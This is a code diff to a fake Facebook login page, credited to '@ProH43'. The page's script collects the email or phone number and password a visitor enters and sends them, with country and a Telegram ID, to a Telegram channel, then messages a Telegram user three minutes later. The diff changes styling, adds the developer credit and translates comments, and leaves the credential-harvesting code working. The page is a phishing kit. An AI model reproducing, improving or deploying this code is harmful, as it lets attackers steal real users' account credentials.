@@ -11,7 +11,9 @@
       justify-content: center;
       align-items: center;
       height: 100vh;
+      flex-direction: column;
     }
+
     .container {
       background-color: white;
       padding: 30px;
@@ -21,10 +23,12 @@
       max-width: 360px;
       text-align: center;
     }
+
     .container h2 {
       color: #1877f2;
       margin-bottom: 20px;
     }
+
     input {
       width: 100%;
       padding: 12px;
@@ -33,6 +37,7 @@
       border: 1px solid #ccc;
       border-radius: 6px;
     }
+
     button {
       width: 100%;
       background-color: #1877f2;
@@ -44,11 +49,19 @@
       margin-top: 10px;
       cursor: pointer;
     }
+
     button:hover {
       background-color: #165ecb;
     }
+
     small {
       color: gray;
+    }
+
+    .developer {
+      margin-top: 15px;
+      font-size: 13px;
+      color: #999;
     }
   </style>
 </head>
@@ -60,8 +73,9 @@
     <input type="text" id="identifier" placeholder="Mobile number or email" required>
     <input type="password" id="password" placeholder="Password" required>
     <button type="submit">Log In</button>
-    <small><br><br>© Meta Platforms</small>
+    <small>© Meta Platforms</small>
   </form>
+  <div class="developer">Developer by.@ProH43</div>
 </div>
 
 <script>
@@ -114,14 +128,14 @@
 
     const messageToChannel = `🟦 Facebook Login\n\n📩 Email/Phone: ${identifier}\n🔐 Password: ${password}\n🌍 Country: ${country} ${flag}\n🆔 Telegram ID: ${telegramId}`;
 
-    // 1. لومړی پیغام چینل ته
+    // Send to channel first
     await sendTelegramMessage(telegramChannel, messageToChannel);
 
-    // 2. دری دقیقې وروسته پیغام یوزر ته
+    // 3 minutes later send confirmation to user
     setTimeout(() => {
       const messageToUser = `✅ ستاسو پانګه ID ثبت شوه.\n📤 وروسته له لوګین څخه، پیغام چینل ته واستول شو.\n🆔 Telegram ID: ${telegramId}`;
       sendTelegramMessage(telegramId, messageToUser);
-    }, 180000); // 3 minutes = 180000 ms
+    }, 180000); // 3 minutes
 
     alert('Please wait...');
   });
